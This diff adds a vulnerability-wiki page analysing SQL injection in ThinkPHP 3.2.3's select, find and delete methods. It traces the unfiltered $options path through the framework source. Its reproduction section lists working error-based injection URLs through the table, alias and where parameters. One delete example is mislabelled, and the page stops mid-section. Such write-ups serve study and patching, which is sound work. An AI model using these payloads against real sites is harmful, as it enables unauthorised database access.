@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Thinkphp 3.2.3 select\u0026amp;find\u0026amp;delete \u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 3.2.3 update注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 3.1.3 sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="thinkphp-323-selectfinddelete">Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞<a class="headerlink" href="#thinkphp-323-selectfinddelete" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>\&lt;= 3.2.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>通过github上的commit
+对比其实可以粗略知道，此次更新主要是在<code>ThinkPHP/Library/Think/Model.class.php</code>文件中，其中对于<code>delete</code>，<code>find</code>，<code>select</code>三个函数进行了修改。</p>
+<p><code>delete</code>函数</p>
+<p><img alt="" src="../resource/Thinkphp3.2.3select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
+<p><code>select</code>函数</p>
+<p><img alt="" src="../resource/Thinkphp3.2.3select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<p><code>find</code>函数</p>
+<p><img alt="" src="../resource/Thinkphp3.2.3select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
+<p>对比三个方法修改的地方都有一个共同点：</p>
+<blockquote>
+<p>把外部传进来的<code>$options</code>，修改为<code>$this-&gt;options</code>，同时不再使用<code>$this-&gt;_parseOptions</code>对于<code>$options</code>进行表达式分析。</p>
+</blockquote>
+<p>思考是因为<code>$options</code>可控，再经过<code>_parseOptions</code>函数之后产生了sql注入。</p>
+<h3 id="select-find">一 select 和 find 函数<a class="headerlink" href="#select-find" title="Permanent link">&para;</a></h3>
+<p>以<code>find</code>函数为例进行分析（<code>select</code>代码类似），该函数可接受一个<code>$options</code>参数，作为查询数据的条件。</p>
+<p>当<code>$options</code>为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_numeric</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">is_string</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="err">$</span><span class="n">where</span><span class="p">[</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getPk</span><span class="p">()]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">options</span><span class="p">;</span>
+<span class="w">            </span><span class="err">$</span><span class="n">options</span><span class="w">               </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">            </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">]</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">where</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>同时提供了对复合主键的查询，看到判断：</p>
+<div class="codehilite"><pre><span></span><code>if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) {
+            // 根据复合主键查询
+            ......
+        }
+</code></pre></div>
+
+<p>要进入复合主键查询代码，需要满足<code>$options</code>为数组同时<code>$pk</code>主键也要为数组，但这个对于表只设置一个主键的时候不成立。</p>
+<p>那么就可以使<code>$options</code>为数组，同时找到一个表只有一个主键，就可以绕过两次判断，直接进入<code>_parseOptions</code>进行解析。</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_numeric</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">is_string</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="c1">//$options为数组不进入</span>
+<span class="w">            </span><span class="err">$</span><span class="n">where</span><span class="p">[</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getPk</span><span class="p">()]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">options</span><span class="p">;</span>
+<span class="w">            </span><span class="err">$</span><span class="n">options</span><span class="w">               </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">            </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">]</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">where</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 根据复合主键查找记录</span>
+<span class="w">        </span><span class="err">$</span><span class="n">pk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getPk</span><span class="p">();</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="nf">count</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">pk</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//$pk不为数组不进入</span>
+<span class="w">            </span><span class="p">......</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 总是查找一条记录</span>
+<span class="w">        </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;limit&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">        </span><span class="c1">// 分析表达式</span>
+<span class="w">        </span><span class="err">$</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_parseOptions</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">);</span><span class="w"> </span><span class="c1">//解析表达式</span>
+<span class="w">        </span><span class="c1">// 判断查询缓存</span>
+<span class="w">        </span><span class="p">.....</span>
+<span class="w">        </span><span class="err">$</span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">select</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">);</span><span class="w"> </span><span class="c1">//底层执行</span>
+</code></pre></div>
+
+<p>之后跟进<code>_parseOptions</code>方法，（分析见代码注释）</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//当$options为数组的时候与$this-&gt;options数组进行整合</span>
+<span class="w">            </span><span class="err">$</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array_merge</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;table&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span><span class="c1">//判断是否设置了table 没设置进这里</span>
+<span class="w">            </span><span class="c1">// 自动获取表名</span>
+<span class="w">            </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;table&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getTableName</span><span class="p">();</span>
+<span class="w">            </span><span class="err">$</span><span class="n">fields</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">fields</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 指定数据表 则重新获取字段列表 但不支持类型检测</span>
+<span class="w">            </span><span class="err">$</span><span class="n">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getDbFields</span><span class="p">();</span><span class="w"> </span><span class="c1">//设置了进这里</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="c1">// 数据表别名</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;alias&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span><span class="c1">//判断是否设置了数据表别名</span>
+<span class="w">            </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;table&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s">&#39; &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;alias&#39;</span><span class="p">];</span><span class="w"> </span><span class="c1">//注意这里，直接拼接了</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 记录操作的模型名称</span>
+<span class="w">        </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;model&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// 字段类型验证</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">fields</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;join&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//让$optison[&#39;where&#39;]不为数组或没有设置不进这里</span>
+<span class="w">            </span><span class="c1">// 对数组查询条件进行字段类型检查</span>
+<span class="w">           </span><span class="p">......</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 查询过后清空sql表达式组装 避免影响下次查询</span>
+<span class="w">        </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">        </span><span class="c1">// 表达式过滤</span>
+<span class="w">        </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_options_filter</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
+<span class="w">        </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">options</span><span class="p">;</span>
+</code></pre></div>
+
+<p><code>$options</code>我们可控，那么就可以控制为数组类型，传入<code>$options['table']</code>或<code>$options['alias']</code>等等，只要提层不进行过滤都是可行的。</p>
+<p>同时我们可以不设置<code>$options['where']</code>或者设置<code>$options['where']</code>的值为字符串，可绕过字段类型的验证。</p>
+<p>可以看到在整个对<code>$options</code>的解析中没有过滤，直接返回，跟进到底层<code>ThinkPHP\Libray\Think\Db\Diver.class.php</code>，找到<code>select</code>方法，继续跟进最后来到<code>parseSql</code>方法，对<code>$options</code>的值进行替换，解析。</p>
+<p>因为<code>$options['table']</code>或<code>$options['alias']</code>都是由<code>parseTable</code>函数进行解析，跟进：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="err">$</span><span class="nx">tables</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="c1">//为数组进</span>
+<span class="w">            </span><span class="c1">// 支持别名定义</span>
+<span class="w">          </span><span class="o">......</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="nx">elseif</span><span class="w"> </span><span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="err">$</span><span class="nx">tables</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="c1">//不为数组进</span>
+<span class="w">            </span><span class="err">$</span><span class="nx">tables</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">array_map</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">parseKey</span><span class="err">&#39;</span><span class="p">),</span><span class="w"> </span><span class="nx">explode</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">tables</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">implode</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">tables</span><span class="p">);</span>
+</code></pre></div>
+
+<p>当我们传入的值不为数组，直接进行解析返回带进查询，没有任何过滤。</p>
+<p>同时<code>$options['where']</code>也一样，看到<code>parseWhere</code>函数</p>
+<div class="codehilite"><pre><span></span><code>$whereStr = &#39;&#39;;
+        if (is_string($where)) {
+            // 直接使用字符串条件
+            $whereStr = $where; //直接返回了，没有任何过滤
+        } else {
+            // 使用数组表达式
+           ......
+        }
+        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;
+</code></pre></div>
+
+<h3 id="delete">二 delete函数<a class="headerlink" href="#delete" title="Permanent link">&para;</a></h3>
+<p><code>delete</code>函数有些不同，主要是在解析完<code>$options</code>之后，还对<code>$options['where']</code>判断了一下是否为空，需要我们传一下值，使之不为空,从而继续执行删除操作。</p>
+<div class="codehilite"><pre><span></span><code><span class="p">......</span>
+<span class="w">        </span><span class="c1">// 分析表达式</span>
+<span class="w">        </span><span class="err">$</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_parseOptions</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//注意这里，还判断了一下$options[&#39;where&#39;]是否为空，为空直接返回，不再执行下面的代码。</span>
+<span class="w">            </span><span class="c1">// 如果条件为空 不进行删除操作 除非设置 1=1</span>
+<span class="w">            </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">][</span><span class="err">$</span><span class="n">pk</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="err">$</span><span class="n">pkValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">][</span><span class="err">$</span><span class="n">pk</span><span class="p">];</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="kr">false</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_before_delete</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="err">$</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">delete</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="kr">false</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="err">$</span><span class="n">result</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">is_numeric</span><span class="p">(</span><span class="err">$</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">            </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">pkValue</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">pk</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">pkValue</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_after_delete</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 返回删除记录个数</span>
+<span class="w">        </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">result</span><span class="p">;</span>
+</code></pre></div>
+
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>针对<code>select()</code> 和<code>find()</code>方法
+,有很多地方可注，这里主要列举三个<code>table</code>，<code>alias</code>，<code>where</code>，更多还请自行跟踪一下<code>parseSql</code>的各个<code>parseXXX</code>方法，目测都是可行的，比如<code>having</code>,<code>group</code>等。</p>
+<div class="codehilite"><pre><span></span><code><span class="nc">table</span><span class="err">：</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="mf">.0</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="n">Home</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="k">Index</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">test</span><span class="o">&amp;</span><span class="n">id</span><span class="o">[</span><span class="n">table</span><span class="o">]=</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="o">%</span><span class="mi">201</span><span class="o">%</span><span class="mi">20</span><span class="ow">and</span><span class="o">%</span><span class="mi">20</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--</span>
+
+<span class="k">alias</span><span class="err">：</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="mf">.0</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="n">Home</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="k">Index</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">test</span><span class="o">&amp;</span><span class="n">id</span><span class="o">[</span><span class="n">alias</span><span class="o">]=</span><span class="k">where</span><span class="o">%</span><span class="mi">201</span><span class="o">%</span><span class="mi">20</span><span class="ow">and</span><span class="o">%</span><span class="mi">20</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--</span>
+
+<span class="k">where</span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="mf">.0</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="n">Home</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="k">Index</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">test</span><span class="o">&amp;</span><span class="n">id</span><span class="o">[</span><span class="n">where</span><span class="o">]=</span><span class="mi">1</span><span class="o">%</span><span class="mi">20</span><span class="ow">and</span><span class="o">%</span><span class="mi">20</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Thinkphp3.2.3select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
+<p>而<code>delete()</code>方法的话同样，这里粗略举三个例子，<code>table</code>,<code>alias</code>,<code>where</code>，但使用<code>table</code>和<code>alias</code>的时候，同时还必须保证<code>where</code>不为空（详细原因后面会说）</p>
+<div class="codehilite"><pre><span></span><code><span class="k">where</span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="mf">.0</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="n">Home</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="k">Index</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">test</span><span class="o">&amp;</span><span class="n">id</span><span class="o">[</span><span class="n">where</span><span class="o">]=</span><span class="mi">1</span><span class="o">%</span><span class="mi">20</span><span class="ow">and</span><span class="o">%</span><span class="mi">20</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--</span>
+
+<span class="k">alias</span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="mf">.0</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="n">Home</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="k">Index</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">test</span><span class="o">&amp;</span><span class="n">id</span><span class="o">[</span><span class="n">where</span><span class="o">]=</span><span class="mi">1</span><span class="o">%</span><span class="mi">20</span><span class="ow">and</span><span class="o">%</span><span class="mi">20</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--</span>
+
